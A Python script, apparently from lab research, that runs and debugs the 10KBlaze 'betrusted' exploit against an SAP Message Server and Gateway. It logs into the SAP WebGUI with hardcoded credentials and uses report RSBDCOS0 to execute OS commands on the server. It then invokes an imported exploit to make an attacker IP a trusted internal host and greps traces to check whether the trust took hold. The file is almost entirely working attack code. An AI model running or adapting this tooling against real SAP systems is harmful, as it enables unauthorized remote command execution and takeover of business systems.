#!/usr/bin/env python3
"""
Diagnostic script for 10KBlaze betrusted exploit investigation.

Reads the SAP Gateway trace (dev_rd) and MS log before/after the exploit
to understand why the GW trusted host list is not being updated.
"""

import sys
import os
import time
import re
import json
import requests
import urllib3
import urllib.parse

urllib3.disable_warnings()

sys.path.insert(0, '/home/joris/Desktop/CLAUDE/SAPMAP')

from sap_rfc_ctypes import RFCConnection
from sap_ms_betrusted import betrusted

# ---- target config ----------------------------------------------------------
HOST      = '192.168.2.209'
PORT      = 3901
ATT_IP    = '192.168.2.210'
INST_NR   = 1
SID       = 'S4H'
SYSNR     = '01'   # ASCS01 instance (MS is here, sysnr=01 → port 3301)
SYSNR_D   = '00'   # D00 instance (GW is here, dispatcher)
CLIENT    = '000'
USER      = 'joris'
PASSWD    = 'SccAdmin123!'
WEBGUI    = f'https://{HOST}:8000'
# MS instance sysnr for RFC to ASCS01 is 01 (port 3301)
# D instance sysnr for RFC to D00 is 00 (port 3300)
RFC_SYSNR = '00'   # RFC goes to D00 (dispatcher handles RFC)

# ---- GW trace path ----------------------------------------------------------
DEV_RD   = '/usr/sap/S4H/D00/work/dev_rd'
DEV_GW   = '/usr/sap/S4H/D00/work/dev_gw'   # alternative name
DEV_DISP = '/usr/sap/S4H/D00/work/dev_disp'


# ============================================================================
# WebGUI helpers (copied inline to avoid dependency on lpe.py)
# ============================================================================

def _webgui_session(base_url, user, passwd, client, tcode):
    session = requests.Session()
    session.auth = (user, passwd)
    session.verify = False
    url = (f"{base_url}/sap/bc/gui/sap/its/webgui"
           f"?sap-client={client}&sap-language=EN"
           f"&~transaction={urllib.parse.quote(tcode)}")
    try:
        r = session.get(url, timeout=20)
    except Exception as e:
        print(f"[-] WebGUI GET failed: {e}")
        return None, None, None, None
    if r.status_code != 200:
        print(f"[-] WebGUI HTTP {r.status_code}")
        return None, None, None, None
    fa = re.findall(r'action="([^"]+)"', r.text)
    m  = re.findall(r'var moin\s*=\s*"([^"]+)"', r.text)
    if not fa or not m:
        print("[-] WebGUI no form/moin")
        return None, None, None, None
    post_url = f"{base_url}{fa[0]}"
    moin = m[0]
    r2 = session.post(
        post_url,
        data=(f"sap-charset=utf-8&~SEC_SESSTOKEN={moin}"
              f"&sap-wd-secure-id={moin}&fkey=ENTER&~okcode="),
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        timeout=20,
    )
    if r2.status_code != 200:
        print(f"[-] WebGUI POST HTTP {r2.status_code}")
        return None, None, None, None
    m2 = re.findall(r"moin:'([^']+)'", r2.text)
    moin = m2[0] if m2 else moin
    return session, post_url, moin, r2.text


def _webgui_batch(session, post_url, moin, ops):
    batch_url = (f"{post_url.rstrip('/')}"
                 f"/batch/json?~RG_WEBGUI=X&sap-statistics=true&~runonsess=1")
    r = session.post(
        batch_url,
        data=json.dumps(ops),
        headers={"Content-Type": "application/json", "moin": moin},
        timeout=30,
    )
    if r.status_code != 200:
        return moin, r.text, []
    m = re.findall(r"moin:'([^']+)'", r.text)
    ti = re.findall(r"cuatitle:'([^']+)'", r.text)
    return m[0] if m else moin, r.text, ti


def exec_os_cmd(cmd):
    """Execute an OS command via WebGUI RSBDCOS0 and return the screen output text."""
    print(f"[*] WebGUI RSBDCOS0: {cmd!r}")
    session, post_url, moin, init_text = _webgui_session(
        WEBGUI, USER, PASSWD, CLIENT,
        "*SE38 RS38M-PROGRAMM=RSBDCOS0;DYNP_OKCODE=strt",
    )
    if not session:
        return None
    if "Execute OS Command" not in (init_text or ""):
        print(f"[-] RSBDCOS0 screen not reached (title check failed)")
        return None

    # Set the command and press F8 (vkey 8 = F8 = "Execute")
    moin, resp, ti = _webgui_batch(session, post_url, moin, [
        {"post": "value/wnd[0]/usr/txt[0,8]", "content": cmd},
        {"post": "vkey/8/ses[0]"},
        {"get": "state/ur"},
    ])

    # Extract text content from the response (strip HTML)
    text = re.sub(r'<[^>]+>', ' ', resp)
    text = re.sub(r'\s+', ' ', text).strip()

    # Look for typical output delimiters in WebGUI responses
    # Screen content typically appears between specific markers
    lines = []
    for m in re.finditer(r"'([^']{5,})'", resp):
        val = m.group(1)
        if any(c in val for c in ['/', '\\', ' ', ':']) and len(val) > 8:
            lines.append(val)

    return resp, text, lines


def read_file_via_rsbdcos0(filepath, tail_lines=None):
    """Read a file from the SAP server via RSBDCOS0 and return raw output."""
    if tail_lines:
        cmd = f"tail -{tail_lines} {filepath}"
    else:
        cmd = f"cat {filepath}"
    result = exec_os_cmd(cmd)
    if result is None:
        return None
    resp, text, lines = result
    return resp


def read_ms_log_via_rfc(max_lines=200):
    """Read the MS log via ZMS_READ_MS_FILE RFC call."""
    print(f"[*] RFC: reading MS log via ZMS_READ_MS_FILE (host={HOST} sysnr={RFC_SYSNR})")
    try:
        conn = RFCConnection(
            ashost=HOST, sysnr=RFC_SYSNR, client=CLIENT,
            user=USER, passwd=PASSWD,
        )
        conn.open()
        result = conn.call('ZMS_READ_MS_FILE', LINES=[])
        conn.close()
        lines = result.get('LINES', [])
        print(f"[*] MS log: got {len(lines)} lines")
        return lines
    except Exception as e:
        print(f"[-] ZMS_READ_MS_FILE failed: {e}")
        return []


def extract_trusted_info(text):
    """Extract lines related to trusted hosts, internal hosts, server table."""
    patterns = [
        r'internal',
        r'trusted',
        r'NILIST',
        r'nilist',
        r'server.*add',
        r'SERVER.*ADD',
        r'192\.168\.2\.210',
        r'gateway',
        r'gwrd',
        r'secinfo',
        r'trusted_host',
        r'gw_trusted',
        r'SAPXPG',
        r'sapxpg',
        r'inthost',
        r'int_host',
    ]
    combined = '|'.join(patterns)
    found = []
    for line in text.split('\n'):
        if re.search(combined, line, re.IGNORECASE):
            found.append(line)
    return found


def read_file_as_text_from_rfc_response(resp):
    """Parse WebGUI batch response and extract displayed text lines."""
    if not resp:
        return ""
    # WebGUI batch returns JSON-like content
    # Look for screen content in the response body
    # The content is typically in a 'content' field or direct text nodes
    lines = []

    # Try to find multiline content blocks
    for m in re.finditer(r'"content"\s*:\s*"([^"]*)"', resp):
        val = m.group(1).replace('\\n', '\n').replace('\\t', '\t')
        lines.append(val)

    if not lines:
        # Fallback: strip all HTML tags and get readable text
        text = re.sub(r'<style[^>]*>.*?</style>', '', resp, flags=re.DOTALL)
        text = re.sub(r'<script[^>]*>.*?</script>', '', text, flags=re.DOTALL)
        text = re.sub(r'<[^>]+>', '\n', text)
        text = re.sub(r'\n\s*\n', '\n', text)
        return text

    return '\n'.join(lines)


# ============================================================================
# Main diagnostic flow
# ============================================================================

def main():
    print("=" * 72)
    print(" 10KBlaze Diagnostic: GW Trust Propagation Investigation")
    print("=" * 72)
    print()

    # ---- Step 1: Read GW trace BEFORE the exploit ---------------------------
    print("[1] Reading Gateway trace (dev_rd) BEFORE exploit...")
    resp_before = read_file_via_rsbdcos0(DEV_RD, tail_lines=100)
    if resp_before:
        trusted_before = extract_trusted_info(
            read_file_as_text_from_rfc_response(resp_before)
        )
        print(f"    Found {len(trusted_before)} trust-related lines BEFORE exploit:")
        for l in trusted_before[-20:]:
            print(f"    | {l[:120]}")
    else:
        print("    [!] Could not read dev_rd")

    print()

    # ---- Step 2: Read MS log BEFORE to get baseline -------------------------
    print("[2] Reading MS log BEFORE exploit...")
    ms_before = read_ms_log_via_rfc(max_lines=50)
    ms_before_text = '\n'.join(str(x) for x in ms_before[-30:])
    print(f"    Last 10 MS log lines:")
    for l in ms_before[-10:]:
        print(f"    | {str(l)[:120]}")

    print()

    # ---- Step 3: Also read dispatcher and GW traces -------------------------
    print("[3] Reading dispatcher trace (dev_disp) BEFORE exploit...")
    resp_disp_before = read_file_via_rsbdcos0(DEV_DISP, tail_lines=50)

    print()

    # ---- Step 4: Check if there's a gw_log or dev_gw trace -----------------
    print("[4] Looking for GW-specific trace files...")
    resp_ls = read_file_via_rsbdcos0('ls -la /usr/sap/S4H/D00/work/dev_*')
    if resp_ls:
        text_ls = read_file_as_text_from_rfc_response(resp_ls)
        print("    GW trace files:")
        for line in text_ls.split('\n'):
            if 'dev_' in line:
                print(f"    | {line[:120]}")

    print()

    # ---- Step 5: Run the exploit --------------------------------------------
    print("[5] Running betrusted exploit...")
    print(f"    target={HOST}:{PORT} attacker_ip={ATT_IP} inst={INST_NR}")
    print()

    t_before = time.time()
    result = betrusted(
        host=HOST,
        port=PORT,
        attacker_ip=ATT_IP,
        instance_nr=INST_NR,
        our_name='',           # auto-derive from MS name
        target_sid=SID,
        nilist_wait=30,        # wait 30s for NILIST request
        dp_version=14,         # kernel 793 → dp_version=14
        kernel_new=True,
        verbose=False,
    )
    t_after = time.time()

    print()
    print(f"[+] betrusted() result after {t_after - t_before:.1f}s:")
    for k, v in result.items():
        print(f"    {k}: {v}")

    print()
    time.sleep(3)   # give SAP a moment to propagate

    # ---- Step 6: Read GW trace AFTER ----------------------------------------
    print("[6] Reading Gateway trace (dev_rd) AFTER exploit...")
    resp_after = read_file_via_rsbdcos0(DEV_RD, tail_lines=100)
    if resp_after:
        trusted_after = extract_trusted_info(
            read_file_as_text_from_rfc_response(resp_after)
        )
        print(f"    Found {len(trusted_after)} trust-related lines AFTER exploit:")
        for l in trusted_after[-20:]:
            print(f"    | {l[:120]}")

    print()

    # ---- Step 7: Read MS log AFTER ------------------------------------------
    print("[7] Reading MS log AFTER exploit (look for SERVER_ADD broadcast)...")
    ms_after = read_ms_log_via_rfc(max_lines=100)
    ms_after_text = '\n'.join(str(x) for x in ms_after)

    # Find new lines compared to before
    ms_before_set = set(str(x) for x in ms_before)
    new_ms_lines = [str(x) for x in ms_after if str(x) not in ms_before_set]
    print(f"    {len(new_ms_lines)} new MS log lines since baseline:")
    for l in new_ms_lines[-40:]:
        print(f"    | {l[:120]}")

    print()

    # ---- Step 8: Check GW internal hosts specifically -----------------------
    print("[8] Searching for attacker IP in GW trace...")
    resp_grep = read_file_via_rsbdcos0(
        f'grep -n "192.168.2.210\\|internal\\|trusted\\|NILIST" '
        f'/usr/sap/S4H/D00/work/dev_rd 2>/dev/null | tail -30'
    )
    if resp_grep:
        text_grep = read_file_as_text_from_rfc_response(resp_grep)
        print("    GW trace grep results:")
        for line in text_grep.split('\n'):
            if line.strip():
                print(f"    | {line[:120]}")

    print()

    # ---- Step 9: Check gw/internal_network parameter ------------------------
    print("[9] Reading Gateway profile for internal_network / trusted params...")
    resp_gw_prof = read_file_via_rsbdcos0(
        f'grep -i "internal\\|trusted\\|nilist\\|acl" '
        f'/usr/sap/S4H/D00/work/dev_rd 2>/dev/null | head -20'
    )
    if resp_gw_prof:
        text_gw = read_file_as_text_from_rfc_response(resp_gw_prof)
        for line in text_gw.split('\n'):
            if line.strip():
                print(f"    | {line[:120]}")

    print()

    # ---- Step 10: Check gwrd process startup for internal hosts -------------
    print("[10] Checking GW trace for startup entries (internal hosts at boot)...")
    resp_boot = read_file_via_rsbdcos0(
        f'grep -n "inthost\\|int_host\\|internalhost\\|trusted_hosts\\|host_list" '
        f'/usr/sap/S4H/D00/work/dev_rd 2>/dev/null'
    )
    if resp_boot:
        text_boot = read_file_as_text_from_rfc_response(resp_boot)
        for line in text_boot.split('\n'):
            if line.strip():
                print(f"    | {line[:120]}")

    print()

    # ---- Step 11: Check dispatcher trace for SERVER_ADD after exploit --------
    print("[11] Checking dispatcher trace for SERVER_ADD entries...")
    resp_disp_after = read_file_via_rsbdcos0(
        f'tail -50 /usr/sap/S4H/D00/work/dev_disp'
    )
    if resp_disp_after:
        text_disp_after = read_file_as_text_from_rfc_response(resp_disp_after)
        for line in text_disp_after.split('\n'):
            if any(kw in line.lower() for kw in
                   ['server', 'add', 'trusted', 'internal', 'gateway', '210']):
                print(f"    | {line[:120]}")

    print()
    print("[*] Diagnostic complete.")
    print()
    print("=== SUMMARY ===")
    print(f"betrusted success: {result.get('success')}")
    print(f"NILIST response:   {result.get('nilist_response')}")
    print(f"New MS log lines:  {len(new_ms_lines)}")
    for l in new_ms_lines:
        if any(kw in l.lower() for kw in
               ['server_add', 'nilist', 'gateway', 'trusted', '210', 'broadcast']):
            print(f"  KEY: {l[:120]}")


if __name__ == '__main__':
    main()
